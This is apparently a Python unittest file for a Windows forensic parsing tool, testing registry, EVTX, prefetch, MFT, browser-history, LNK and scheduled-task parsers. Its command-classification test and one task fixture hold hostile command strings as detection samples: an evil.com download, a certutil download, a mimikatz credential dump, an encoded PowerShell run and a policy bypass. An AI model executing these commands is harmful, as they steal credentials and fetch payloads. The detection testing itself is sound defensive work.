import hashlib
import json
import sqlite3
import struct
import tempfile
import unittest
from contextlib import closing
from pathlib import Path

from log_hunter.core.models import ForensicEvent
from log_hunter.core.timestamp import filetime, chromium_timestamp
from log_hunter.core.normalization import split_windows_command, expand_environment_path
from log_hunter.core.correlation import correlate, _normalize_url, summarize_correlations
from log_hunter.core.timeline import timeline
from log_hunter.core.pipeline import Pipeline
from log_hunter.main import save_result
from log_hunter.parser.userassist import parse_userassist_value, decode_rot13, resolve_guid_path, KNOWN_GUIDS
from log_hunter.parser.mru import parse_mru_list_ex
from log_hunter.parser.bam import parse_bam_binary
from log_hunter.parser.mft import apply_fixup
from log_hunter.parser.registry import Hive, replay_logs
from log_hunter.parser.evtx import EVTXParser, _crc32, classify_event, SYSMON_EVENTS, POWERSHELL_EVENTS, extract_security_details
from log_hunter.parser.cache import CacheParser
from log_hunter.database.repository import Repository, _dedup_key
from log_hunter.parser.prefetch import PrefetchParser
from log_hunter.collector.winapi import NativeAPI
from log_hunter.collector.vss_manager import VSSManager
from log_hunter.parser.binxml import extract_event_fields, decode_value, VALUE_UINT16, VALUE_STRING, VALUE_FILETIME
from log_hunter.parser.psreadline import classify_command, assess_risk
from log_hunter.parser.shellbag import ShellBagParser
from log_hunter.parser.mft import decode_data_runs, ATTR_NAMES
from log_hunter.parser.srum import SRUMParser
from log_hunter.parser.lnk import LNKParser, parse_lnk
from log_hunter.parser.jumplist import KNOWN_APP_IDS
from log_hunter.parser.tasks import TaskSchedulerParser, parse_task_xml
from log_hunter.parser.network import NetworkProfileParser
from log_hunter.parser.wlan import WLANParser, parse_wlan_xml
from log_hunter.parser.startup import StartupParser
from log_hunter.core.auto_detect import detect_artifact, detect_artifacts_in_directory
from log_hunter.core.sid_resolver import resolve_sids


def build_hive(values):
    """Generate a real REGF nk/vk cell fixture, not a mock parser result."""
    header = bytearray(4096)
    header[:4] = b"regf"
    struct.pack_into("<II", header, 4, 1, 1)
    cells = bytearray(b"hbin" + b"\0" * 28)
    def cell(payload):
        offset = len(cells)
        size = (len(payload) + 4 + 7) & ~7
        cells.extend(struct.pack("<i", -size) + payload + b"\0" * (size - 4 - len(payload)))
        return offset
    offsets = []
    for name, kind, raw in values:
        block = cell(raw)
        vk = bytearray(20)
        vk[:2] = b"vk"
        struct.pack_into("<HIIIH", vk, 2, len(name), len(raw), block, kind, 1)
        offsets.append(cell(vk + name.encode("ascii")))
    listing = cell(b"".join(struct.pack("<I", index) for index in offsets))
    nk = bytearray(76)
    nk[:2] = b"nk"
    struct.pack_into("<H", nk, 2, 0x20)
    struct.pack_into("<II", nk, 36, len(values), listing)
    struct.pack_into("<H", nk, 72, 4)
    root = cell(nk + b"ROOT")
    struct.pack_into("<I", header, 0x24, root)
    return bytes(header + cells)


class AnalysisTests(unittest.TestCase):
    def test_timestamp_units(self):
        stamp = 132537600000000000
        self.assertEqual(filetime(stamp), "2020-12-30T00:00:00+00:00")
        self.assertEqual(filetime(stamp), chromium_timestamp(stamp // 10))
        self.assertIsNone(filetime(0))
        self.assertIsNone(filetime(0xffffffffffffffff))

    def test_userassist_offsets_and_legacy(self):
        data = bytearray(72)
        struct.pack_into("<III", data, 4, 9, 2, 345)
        struct.pack_into("<Q", data, 60, 132537600000000000)
        result = parse_userassist_value(data)
        self.assertEqual((result["run_count"], result["focus_count"], result["focus_time_ms"]), (9, 2, 345))
        legacy = struct.pack("<IIQ", 0, 8, 132537600000000000)
        self.assertEqual(parse_userassist_value(legacy)["run_count"], 3)
        self.assertEqual(decode_rot13("P:\\Grfg.rkr"), "C:\\Test.exe")
        with self.assertRaises(ValueError):
            parse_userassist_value(b"short")

    def test_mru_order_and_truncation(self):
        self.assertEqual(parse_mru_list_ex(struct.pack("<III", 2, 0, 0xffffffff)), [2, 0])
        with self.assertRaises(ValueError):
            parse_mru_list_ex(b"\x00")
        with self.assertRaises(ValueError):
            parse_mru_list_ex(struct.pack("<I", 2))

    def test_bam_short_value(self):
        with self.assertRaises(ValueError):
            parse_bam_binary(b"123")

    def test_prefetch_version_offsets_and_reference_strings(self):
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "APP.EXE-12345678.pf"
            data = bytearray(300)
            struct.pack_into("<I", data, 0, 30)
            data[4:8] = b"SCCA"
            data[16:32] = "APP.EXE\0".encode("utf-16-le")
            struct.pack_into("<I", data, 76, 0x12345678)
            refs = "C:\\APP.EXE\0C:\\kernel32.dll\0".encode("utf-16-le")
            struct.pack_into("<II", data, 100, 240, len(refs))
            struct.pack_into("<Q", data, 128, 132537600000000000)
            struct.pack_into("<I", data, 208, 9)
            data[240:240 + len(refs)] = refs
            source.write_bytes(data)
            events = list(PrefetchParser().parse(source))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].process, "APP.EXE")
            self.assertEqual(events[0].details["run_count"], 9)
            self.assertEqual(events[0].details["prefetch_hash"], "12345678")
            self.assertEqual(events[0].details["references"][0], "C:\\APP.EXE")
            struct.pack_into("<I", data, 0, 99)
            source.write_bytes(data)
            with self.assertRaises(ValueError):
                list(PrefetchParser().parse(source))

    def test_report_cannot_overwrite_original_evidence(self):
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "report.json"
            source.write_text("Remove-Item a\n", encoding="utf-8")
            original = source.read_bytes()
            result = Pipeline().analyze([("psreadline", source)])
            with self.assertRaises(ValueError):
                save_result(result, directory)
            self.assertEqual(source.read_bytes(), original)

    def test_commands_are_not_executed_and_environment_is_target_only(self):
        result = split_windows_command('"C:\\Program Files\\app.exe" -silent')
        self.assertEqual(result["arguments"], "-silent")
        self.assertFalse(result["ambiguous"])
        self.assertTrue(split_windows_command(r"C:\Program Files\app.exe -s")["ambiguous"])
        self.assertEqual(expand_environment_path("%USERPROFILE%\\x", {}), "%USERPROFILE%\\x")
        self.assertEqual(expand_environment_path("%TEMP%\\x", {"temp": "D:\\tmp"}), "D:\\tmp\\x")

    def test_registry_real_cells_and_bounds(self):
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "NTUSER.DAT"
            source.write_bytes(build_hive([("Name", 1, "test\0".encode("utf-16-le")), ("Number", 4, struct.pack("<I", 42))]))
            before = source.read_bytes()
            hive = Hive(source)
            self.assertEqual(hive.root.value("Name"), "test")
            self.assertEqual(hive.root.value("Number"), 42)
            with self.assertRaises(ValueError):
                hive.cell(0xffffffff)
            self.assertEqual(source.read_bytes(), before)

    def test_mft_fixup_detects_torn_record(self):
        record = bytearray(1024)
        record[:4] = b"FILE"
        struct.pack_into("<HH", record, 4, 48, 3)
        record[48:54] = b"AA1122"
        record[510:512] = record[1022:1024] = b"AA"
        fixed = apply_fixup(record)
        self.assertEqual(fixed[510:512], b"11")
        self.assertEqual(fixed[1022:1024], b"22")
        record[510] = 0
        with self.assertRaises(ValueError):
            apply_fixup(record)

    def test_evtx_direct_scanner_recovers_after_bad_record(self):
        header = bytearray(4096)
        header[:8] = b"ElfFile\0"
        struct.pack_into("<HH", header, 36, 1, 3)
        struct.pack_into("<H", header, 42, 1)
        chunk = bytearray(65536)
        chunk[:8] = b"ElfChnk\0"
        offset = 520  # one corrupt 8-byte area before a valid record
        struct.pack_into("<IIQQ", chunk, offset, 0x2a2a, 32, 7, 132537600000000000)
        struct.pack_into("<I", chunk, offset + 28, 32)
        struct.pack_into("<I", chunk, 48, offset + 32)
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "sample.evtx"
            path.write_bytes(header + chunk)
            parser = EVTXParser()
            events = list(parser.parse(path))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].details["record_id"], 7)
            self.assertFalse(events[0].details["xml_decoded"])
            self.assertTrue(any("크기 오류" in e.message for e in parser.errors))

    def test_history_wal_integrity_and_exports(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "History"
            database = sqlite3.connect(path)
            database.execute("PRAGMA journal_mode=WAL")
            database.execute("CREATE TABLE urls(id INTEGER PRIMARY KEY,url TEXT,title TEXT,last_visit_time INTEGER)")
            database.execute("CREATE TABLE visits(id INTEGER,url INTEGER,visit_time INTEGER,transition INTEGER)")
            database.execute("INSERT INTO urls VALUES(1,'https://example.org','title',13253760000000000)")
            database.execute("INSERT INTO visits VALUES(1,1,13253760000000000,0)")
            database.commit()
            sources = [path, Path(str(path) + "-wal"), Path(str(path) + "-shm")]
            before = {p: hashlib.sha256(p.read_bytes()).hexdigest() for p in sources}
            result = Pipeline().analyze([("history", path)])
            self.assertEqual(len(result.events), 1)
            self.assertEqual(result.events[0].url, "https://example.org")
            self.assertEqual(result.events[0].source, str(path))
            self.assertEqual(before, {p: hashlib.sha256(p.read_bytes()).hexdigest() for p in sources})
            output = Path(directory) / "output"
            save_result(result, output)
            payload = json.loads((output / "report.json").read_text(encoding="utf-8"))
            self.assertEqual(len(payload["evidence"]), 3)
            with closing(sqlite3.connect(output / "case.sqlite")) as db:
                self.assertEqual(db.execute("SELECT count(*) FROM events").fetchone()[0], 1)
                self.assertEqual(db.execute("PRAGMA foreign_key_check").fetchall(), [])
            database.close()

    def test_missing_file_does_not_stop_batch(self):
        with tempfile.TemporaryDirectory() as directory:
            history = Path(directory) / "history.txt"
            history.write_text("Remove-Item a\nInvoke-WebRequest https://example.org\n", encoding="utf-8")
            result = Pipeline().analyze([("prefetch", Path(directory) / "missing.pf"), ("psreadline", history)])
            self.assertEqual(len(result.events), 2)
            self.assertTrue(all(e.timestamp is None for e in result.events))
            self.assertEqual(result.summaries[0]["state"], "failed")
            self.assertEqual(result.summaries[1]["state"], "ok")

    def test_correlation_does_not_prove_execution_or_cross_sids(self):
        events = [ForensicEvent("prefetch", "a", "trace", process="APP.EXE"),
                  ForensicEvent("bam", "b", "activity", sid="S-1", path=r"C:\app.exe"),
                  ForensicEvent("run", "c", "registration", sid="S-2", path=r"C:\app.exe")]
        relations = correlate(events)
        path_relations = [r for r in relations if r.get("type") == "path_correlation"]
        self.assertEqual(len(path_relations), 2)
        self.assertTrue(all(r["basis"] == "filename_only" and not r["execution_confirmed"] for r in path_relations))
        non_chain = [r for r in relations if r.get("type") != "execution_chain"]
        self.assertTrue(all(not r["execution_confirmed"] for r in non_chain))
        ordered = timeline([events[0], ForensicEvent("bam", "d", "activity", "2020-12-30T00:00:00+00:00")])
        self.assertIsNone(ordered[-1].timestamp)

    def test_vss_path_mapping_and_reuse_without_live_snapshot(self):
        class Fake:
            pass
        manager = VSSManager(Fake())
        with self.assertRaises(NotImplementedError):
            manager.get_snapshot("C:")
        with self.assertRaises(NotImplementedError):
            manager.convert_path(r"C:\Users\alice\NTUSER.DAT")
        manager.cleanup()
        manager.cleanup()

    @unittest.skipUnless(__import__("os").name == "nt", "Windows collection API")
    def test_native_shared_read_roundtrip_and_no_overwrite(self):
        api = NativeAPI()
        with tempfile.TemporaryDirectory() as directory:
            source, target = Path(directory) / "원본.bin", Path(directory) / "수집.bin"
            payload = bytes(range(256)) * 1024
            source.write_bytes(payload)
            api.copy_shared(source, target)
            self.assertEqual(target.read_bytes(), payload)
            with self.assertRaises(OSError):
                api.copy_shared(source, target)
            self.assertEqual(target.read_bytes(), payload)


    def test_binxml_decode_value_types(self):
        data = struct.pack("<H", 4624)
        value, _ = decode_value(data, 0, VALUE_UINT16, 2)
        self.assertEqual(value, 4624)
        text = "Security\0".encode("utf-16-le")
        value, _ = decode_value(text, 0, VALUE_STRING, len(text))
        self.assertEqual(value, "Security")
        ft = struct.pack("<Q", 132537600000000000)
        value, _ = decode_value(ft, 0, VALUE_FILETIME, 8)
        self.assertIn("2020-12-30", value)
        value, _ = decode_value(struct.pack("<Q", 0), 0, VALUE_FILETIME, 8)
        self.assertIsNone(value)

    def test_binxml_extract_fields_from_elements(self):
        elements = [
            {"name": "System", "attrs": {}, "text": None, "children": [
                {"name": "Provider", "attrs": {"Name": "Microsoft-Windows-Security-Auditing", "Guid": "{abc}"}, "text": None, "children": []},
                {"name": "EventID", "attrs": {}, "text": "4624", "children": []},
                {"name": "Level", "attrs": {}, "text": "0", "children": []},
                {"name": "Channel", "attrs": {}, "text": "Security", "children": []},
                {"name": "Computer", "attrs": {}, "text": "WORKSTATION1", "children": []},
                {"name": "Security", "attrs": {"UserID": "S-1-5-18"}, "text": None, "children": []},
                {"name": "Execution", "attrs": {"ProcessID": 636, "ThreadID": 1234}, "text": None, "children": []},
            ]},
            {"name": "EventData", "attrs": {}, "text": None, "children": [
                {"name": "Data", "attrs": {"Name": "TargetUserName"}, "text": "admin", "children": []},
                {"name": "Data", "attrs": {"Name": "LogonType"}, "text": "10", "children": []},
            ]},
        ]
        fields = extract_event_fields(elements)
        self.assertEqual(fields["event_id"], 4624)
        self.assertEqual(fields["level"], 0)
        self.assertEqual(fields["channel"], "Security")
        self.assertEqual(fields["computer"], "WORKSTATION1")
        self.assertEqual(fields["provider_name"], "Microsoft-Windows-Security-Auditing")
        self.assertEqual(fields["security_user_id"], "S-1-5-18")
        self.assertEqual(fields["process_id"], 636)
        self.assertEqual(fields["event_data"]["TargetUserName"], "admin")
        self.assertEqual(fields["event_data"]["LogonType"], "10")

    def test_evtx_parser_decodes_binxml_when_present(self):
        with tempfile.TemporaryDirectory() as directory:
            header = bytearray(4096)
            header[:8] = b"ElfFile\0"
            struct.pack_into("<HH", header, 36, 1, 3)
            struct.pack_into("<H", header, 42, 1)
            chunk = bytearray(65536)
            chunk[:8] = b"ElfChnk\0"
            offset = 520
            struct.pack_into("<IIQQ", chunk, offset, 0x2a2a, 32, 7, 132537600000000000)
            struct.pack_into("<I", chunk, offset + 28, 32)
            struct.pack_into("<I", chunk, 48, offset + 32)
            path = Path(directory) / "sample.evtx"
            path.write_bytes(header + chunk)
            parser = EVTXParser()
            events = list(parser.parse(path))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].details["record_id"], 7)

    def test_evtx_sysmon_classification(self):
        cats = classify_event(1, "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")
        self.assertIn("SYSMON", cats)
        self.assertIn("PROCESS", cats)
        cats3 = classify_event(3, "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")
        self.assertIn("NETWORK", cats3)
        cats8 = classify_event(8, None, "Microsoft-Windows-Sysmon")
        self.assertIn("LATERAL_MOVEMENT", cats8)
        cats2 = classify_event(2, None, "Microsoft-Windows-Sysmon")
        self.assertIn("TIMESTOMP", cats2)
        cats11 = classify_event(11, None, "Microsoft-Windows-Sysmon")
        self.assertIn("FILE_REGISTRY", cats11)
        self.assertEqual(len(SYSMON_EVENTS), 22)
        non_sysmon = classify_event(4624, "Security", None)
        self.assertIn("SECURITY", non_sysmon)
        self.assertNotIn("SYSMON", non_sysmon)

    def test_evtx_powershell_classification(self):
        cats = classify_event(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell")
        self.assertIn("POWERSHELL", cats)
        self.assertIn("SCRIPTBLOCK", cats)
        cats2 = classify_event(4103, None, "Microsoft-Windows-PowerShell")
        self.assertIn("MODULE_LOG", cats2)
        self.assertEqual(len(POWERSHELL_EVENTS), 8)

    def test_userassist_guid_resolution(self):
        path = "{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\cmd.exe"
        resolved = resolve_guid_path(path)
        self.assertEqual(resolved, "%windir%\\system32\\cmd.exe")
        unknown = "{00000000-0000-0000-0000-000000000000}\\app.exe"
        self.assertEqual(resolve_guid_path(unknown), unknown)
        no_guid = "C:\\Windows\\notepad.exe"
        self.assertEqual(resolve_guid_path(no_guid), no_guid)
        self.assertGreaterEqual(len(KNOWN_GUIDS), 20)

    def test_execution_chain_correlation(self):
        events = [
            ForensicEvent("prefetch", "a", "trace", "2020-06-15T10:00:00+00:00", process="APP.EXE"),
            ForensicEvent("bam", "b", "activity", "2020-06-15T10:01:00+00:00", sid="S-1", path=r"C:\app.exe"),
            ForensicEvent("evtx", "c", "새 프로세스 생성", "2020-06-15T10:00:30+00:00",
                          process=r"C:\app.exe", details={"event_id": 4688}),
        ]
        relations = correlate(events)
        chains = [r for r in relations if r.get("type") == "execution_chain"]
        self.assertTrue(len(chains) >= 1)
        app_chain = next((c for c in chains if c["process"] == "app"), None)
        self.assertIsNotNone(app_chain)
        self.assertEqual(app_chain["confidence"], "corroborated_execution")
        self.assertIn("prefetch", app_chain["sources"])
        self.assertIn("bam", app_chain["sources"])
        self.assertIn("evtx", app_chain["sources"])
        summary = summarize_correlations(relations, events)
        self.assertGreaterEqual(summary["execution_chains"], 1)

    def test_psreadline_enhanced_classification(self):
        self.assertIn("DOWNLOAD", classify_command("Invoke-WebRequest https://evil.com"))
        self.assertIn("DOWNLOAD", classify_command("certutil -urlcache -split -f http://x"))
        self.assertIn("CREDENTIAL", classify_command("mimikatz sekurlsa::logonpasswords"))
        self.assertIn("RECON", classify_command("whoami /all"))
        self.assertIn("POWERSHELL_EVASION", classify_command("powershell -ExecutionPolicy Bypass -nop"))
        self.assertEqual(assess_risk(["DOWNLOAD", "CREDENTIAL"]), "high")
        self.assertEqual(assess_risk(["REGISTRY"]), "medium")
        self.assertEqual(assess_risk(["OTHER"]), "low")

    def test_correlation_temporal_proximity(self):
        events = [
            ForensicEvent("prefetch", "a", "trace", "2020-12-30T00:00:00+00:00", process="APP.EXE"),
            ForensicEvent("bam", "b", "activity", "2020-12-30T00:00:30+00:00", sid="S-1", path=r"C:\app.exe"),
            ForensicEvent("bam", "c", "activity", "2020-12-31T12:00:00+00:00", sid="S-1", path=r"C:\app.exe"),
        ]
        relations = correlate(events)
        temporal = [r for r in relations if r.get("temporal_proximity")]
        non_temporal = [r for r in relations if not r.get("temporal_proximity")]
        self.assertTrue(len(temporal) >= 1)
        self.assertTrue(any(r.get("delta_seconds", 999) <= 60 for r in temporal))
        non_chain = [r for r in relations if r.get("type") != "execution_chain"]
        self.assertTrue(all(not r["execution_confirmed"] for r in non_chain))

    def test_shellbag_parser_on_hive(self):
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "NTUSER.DAT"
            source.write_bytes(build_hive([]))
            parser = ShellBagParser()
            events = list(parser.parse(source))
            self.assertEqual(len(events), 0)

    def test_evtx_crc32_checksum(self):
        data = b"ElfFile\0" + b"\x00" * 112
        header_crc = _crc32(data[:120])
        self.assertIsInstance(header_crc, int)
        self.assertEqual(header_crc, _crc32(data[:120]))
        self.assertNotEqual(header_crc, _crc32(data[:120] + b"\x01"))

    def test_cache_parser_fallback_urls(self):
        with tempfile.TemporaryDirectory() as directory:
            cache_dir = Path(directory) / "cache"
            cache_dir.mkdir()
            data_file = cache_dir / "data"
            data_file.write_bytes(b"\x00" * 100 + b"https://example.com/page?q=1" + b"\x00" * 100)
            parser = CacheParser()
            events = list(parser.parse(cache_dir))
            urls = [e.url for e in events if e.url]
            self.assertTrue(any("example.com" in u for u in urls))
            self.assertTrue(all(e.status == "partial" for e in events))

    def test_entity_dedup_key(self):
        self.assertEqual(_dedup_key("users", "S-1-5-21-123"), "S-1-5-21-123")
        self.assertEqual(_dedup_key("files", r"C:\Users\alice\file.txt"), r"c:\users\alice\file.txt")
        self.assertEqual(_dedup_key("urls", "https://example.com/"), "https://example.com")
        self.assertIsNone(_dedup_key("files", None))

    def test_entity_dedup_in_repository(self):
        with tempfile.TemporaryDirectory() as directory:
            db_path = Path(directory) / "test.sqlite"
            repo = Repository(db_path)
            try:
                events = [
                    ForensicEvent("test", "src", "act1", sid="S-1-5-21-100", path=r"C:\Program Files\app.exe"),
                    ForensicEvent("test", "src", "act2", sid="S-1-5-21-100", path=r"c:\program files\APP.EXE"),
                    ForensicEvent("test", "src", "act3", sid="S-1-5-21-200", path=r"C:\other.exe"),
                ]
                case_id = repo.save("test_case", [], events, [], [])
                summary = repo.entity_summary(case_id)
                files_summary = summary.get("files", {})
                self.assertEqual(files_summary.get("total"), 2)
                top = files_summary.get("top", [])
                app_entry = next((t for t in top if "app.exe" in t.get("value", "").lower()), None)
                self.assertIsNotNone(app_entry)
                self.assertEqual(app_entry["count"], 2)
            finally:
                repo.close()

    def test_registry_replay_logs_clean_hive(self):
        hive_data = build_hive([])
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "SYSTEM"
            path.write_bytes(hive_data)
            recovered, info = replay_logs(path)
            self.assertFalse(info["dirty"])
            self.assertFalse(info["recovered"])
            self.assertEqual(recovered, hive_data)

    def test_registry_replay_logs_dirty_no_logs(self):
        hive_data = bytearray(build_hive([]))
        struct.pack_into("<I", hive_data, 4, 10)
        struct.pack_into("<I", hive_data, 8, 5)
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "SYSTEM"
            path.write_bytes(hive_data)
            recovered, info = replay_logs(path)
            self.assertTrue(info["dirty"])
            self.assertFalse(info["recovered"])
            self.assertTrue(len(info["warnings"]) > 0)

    def test_timeline_date_range_filter(self):
        events = [
            ForensicEvent("test", "a", "act", "2024-01-01T00:00:00+00:00"),
            ForensicEvent("test", "b", "act", "2024-06-15T12:00:00+00:00"),
            ForensicEvent("test", "c", "act", "2024-12-31T23:59:59+00:00"),
        ]
        filtered = timeline(events, start="2024-03-01", end="2024-09-01")
        self.assertEqual(len(filtered), 1)
        self.assertEqual(filtered[0].source, "b")

    def test_mft_data_run_decoding(self):
        # 1 byte length, 2 byte offset: run of 0x10 clusters starting at LCN 0x0100
        data = bytearray([0x21, 0x10, 0x00, 0x01, 0x00])
        runs = decode_data_runs(data, 0, len(data))
        self.assertEqual(len(runs), 1)
        self.assertEqual(runs[0]["length"], 0x10)
        self.assertEqual(runs[0]["lcn"], 0x0100)
        self.assertFalse(runs[0]["sparse"])

    def test_mft_data_run_sparse(self):
        data = bytearray([0x01, 0x08, 0x00])
        runs = decode_data_runs(data, 0, len(data))
        self.assertEqual(len(runs), 1)
        self.assertTrue(runs[0]["sparse"])
        self.assertEqual(runs[0]["length"], 8)

    def test_mft_data_run_multiple(self):
        data = bytearray([0x21, 0x05, 0x00, 0x02, 0x21, 0x03, 0x10, 0x00, 0x00])
        runs = decode_data_runs(data, 0, len(data))
        self.assertEqual(len(runs), 2)
        self.assertEqual(runs[0]["lcn"], 0x0200)
        self.assertEqual(runs[1]["lcn"], 0x0200 + 0x0010)

    def test_mft_attr_names(self):
        self.assertEqual(ATTR_NAMES[0x10], "$STANDARD_INFORMATION")
        self.assertEqual(ATTR_NAMES[0x80], "$DATA")
        self.assertEqual(ATTR_NAMES[0x30], "$FILE_NAME")

    def test_srum_parser_on_non_srum_file(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "not_srum.dat"
            path.write_bytes(b"not a database")
            parser = SRUMParser()
            events = list(parser.parse(path))
            self.assertEqual(len(events), 0)
            self.assertTrue(len(parser.errors) > 0)

    def test_url_normalization(self):
        self.assertEqual(_normalize_url("https://www.Example.Com/page/"), "https://example.com/page")
        self.assertEqual(_normalize_url("http://EXAMPLE.COM"), "http://example.com/")
        self.assertIsNone(_normalize_url(None))
        self.assertIsNone(_normalize_url(""))

    def test_correlation_url_matching(self):
        events = [
            ForensicEvent("history", "a", "visit", "2024-01-01T00:00:00+00:00", url="https://www.example.com/page"),
            ForensicEvent("cache", "b", "cache_entry", "2024-01-01T00:00:05+00:00", url="https://example.com/page/"),
        ]
        relations = correlate(events)
        url_rels = [r for r in relations if r.get("type") == "url_correlation"]
        self.assertEqual(len(url_rels), 1)
        self.assertEqual(url_rels[0]["basis"], "url_match")

    def test_correlation_program_grouping(self):
        events = [
            ForensicEvent("prefetch", "a", "trace", process="svchost.exe"),
            ForensicEvent("bam", "b", "activity", path=r"C:\Windows\System32\svchost.exe"),
            ForensicEvent("evtx", "c", "event_record", process=r"C:\Windows\System32\svchost.exe"),
        ]
        relations = correlate(events)
        pg_rels = [r for r in relations if r.get("type") == "program_group"]
        self.assertTrue(len(pg_rels) >= 1)
        self.assertTrue(all(r["program"] == "svchost.exe" for r in pg_rels))

    def test_correlation_summary(self):
        events = [
            ForensicEvent("history", "a", "visit", url="https://example.com"),
            ForensicEvent("cache", "b", "entry", url="https://example.com"),
        ]
        relations = correlate(events)
        summary = summarize_correlations(relations, events)
        self.assertIn("total_relations", summary)
        self.assertIn("url_matches", summary)

    def test_lnk_parser_valid_header(self):
        data = bytearray(256)
        data[0:4] = b"\x4C\x00\x00\x00"
        data[4:20] = b"\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
        struct.pack_into("<I", data, 20, 0)  # flags: no optional sections
        struct.pack_into("<I", data, 24, 0x20)  # attrs
        struct.pack_into("<QQQ", data, 28, 132537600000000000, 132537600000000000, 132537600000000000)
        struct.pack_into("<I", data, 52, 1024)  # file size
        result = parse_lnk(bytes(data))
        self.assertIsNotNone(result)
        self.assertEqual(result.get("file_size"), 1024)
        self.assertIn("creation_time", result)

    def test_lnk_parser_invalid_data(self):
        with self.assertRaises(ValueError):
            parse_lnk(b"not a lnk file")

    def test_lnk_parser_on_directory(self):
        with tempfile.TemporaryDirectory() as directory:
            lnk = Path(directory) / "test.lnk"
            data = bytearray(256)
            data[0:4] = b"\x4C\x00\x00\x00"
            data[4:20] = b"\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
            struct.pack_into("<I", data, 20, 0)
            struct.pack_into("<QQQ", data, 28, 132537600000000000, 132537600000000000, 132537600000000000)
            lnk.write_bytes(data)
            parser = LNKParser()
            events = list(parser.parse(Path(directory)))
            self.assertTrue(len(events) >= 1)

    def test_jumplist_known_app_ids(self):
        self.assertIn("1b4dd67f29cb1962", KNOWN_APP_IDS)
        self.assertIn("5d696d521de238c3", KNOWN_APP_IDS)

    def test_srum_parser_on_sqlite(self):
        with tempfile.TemporaryDirectory() as directory:
            db_path = Path(directory) / "srum.sqlite"
            conn = sqlite3.connect(db_path)
            conn.executescript('''
                CREATE TABLE SruDbIdMapTable(IdType INTEGER, IdIndex INTEGER, IdBlob BLOB);
                INSERT INTO SruDbIdMapTable VALUES(0, 1, X'43003A005C006100700070002E00650078006500');
            ''')
            conn.close()
            parser = SRUMParser()
            events = list(parser.parse(db_path))
            self.assertEqual(len(events), 0)
            warnings = [e for e in parser.errors if e.severity == "warning"]
            self.assertTrue(len(warnings) >= 0)


    def test_task_scheduler_parse_basic(self):
        xml = '''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>SYSTEM</Author><Date>2024-01-15T10:00:00</Date>
    <Description>Test</Description><URI>\\TestTask</URI></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c echo hello</Arguments></Exec></Actions>
  <Principals><Principal><UserId>SYSTEM</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Enabled>true</Enabled><Hidden>true</Hidden></Settings>
</Task>'''
        result = parse_task_xml(xml, 'TestTask')
        self.assertEqual(result['task_name'], 'TestTask')
        self.assertEqual(result['author'], 'SYSTEM')
        self.assertIn('admin_execution', result['suspicion_flags'])
        self.assertIn('hidden_task', result['suspicion_flags'])
        self.assertEqual(result['risk_level'], 'high')
        self.assertEqual(len(result['triggers']), 1)
        self.assertEqual(result['triggers'][0]['type'], 'BootTrigger')

    def test_task_scheduler_suspicious_command(self):
        xml = '''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>User</Author></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Actions><Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgA</Arguments></Exec></Actions>
  <Principals><Principal><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>
  <Settings><Enabled>true</Enabled></Settings>
</Task>'''
        result = parse_task_xml(xml, 'Susp')
        self.assertIn('suspicious_command', result['suspicion_flags'])

    def test_task_scheduler_invalid_xml(self):
        self.assertIsNone(parse_task_xml("not xml", "bad"))
        self.assertIsNone(parse_task_xml("<Root>hi</Root>", "notask"))

    def test_task_scheduler_parser_class(self):
        xml = '''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>Test</Author></RegistrationInfo>
  <Actions><Exec><Command>notepad.exe</Command></Exec></Actions>
  <Principals><Principal><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>
  <Settings><Enabled>true</Enabled></Settings>
</Task>'''
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / 'TestTask'
            p.write_text(xml, encoding='utf-8-sig')
            parser = TaskSchedulerParser()
            events = list(parser.parse(d))
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].details['task_name'], 'TestTask')
            self.assertEqual(events[0].details['risk_level'], 'low')
            self.assertEqual(events[0].action, 'task_definition')

    def test_network_profile_parser_artifact(self):
        parser = NetworkProfileParser()
        self.assertEqual(parser.artifact, "network")

    def test_network_parse_time(self):
        from log_hunter.parser.network import _parse_network_time
        raw = struct.pack("<HHHHHHHH", 2024, 6, 3, 15, 10, 30, 45, 0)
        result = _parse_network_time(raw)
        self.assertIn("2024-06-15", result)
        self.assertIsNone(_parse_network_time(b"\x00" * 4))

    def test_evtx_sysmon_classify(self):
        from log_hunter.parser.evtx import classify_event
        cats = classify_event(1, "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")
        self.assertIn("SYSMON", cats)
        self.assertIn("PROCESS", cats)
        cats_net = classify_event(3, "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")
        self.assertIn("NETWORK", cats_net)
